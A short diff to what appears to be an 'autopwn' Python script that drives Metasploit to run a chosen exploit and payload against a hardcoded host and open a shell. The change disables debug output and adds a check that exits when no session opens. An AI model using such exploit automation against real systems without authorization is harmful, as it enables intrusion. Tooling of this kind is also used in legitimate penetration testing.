@@ -41,7 +41,7 @@ LOG("Launched autopwn.", logfile, "inf")
 IP = "192.168.1.45"
 EXPLOIT_LIST = "./exploit_list"
 
-debug = 1
+debug = 0
 
 
 def show_pwnguin():
@@ -273,9 +273,15 @@ def exploitVuln(
             exploit[i] = input(i + ": ")
 
     print(exploit.execute(payload=payload))
-
+    #cid = client.consoles.console().cid
+    #client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
     while len(client.jobs.list) != 0:
         pass
+    if (client.sessions.list == {}) : 
+        LOG("Error 9 : Exploit could not be executed", logfile, "err")
+        print("[X] Error 9 : Exploit could not be executed")
+        exit(-9)
+    
 
 
 def getShell(client=None, id="1"):
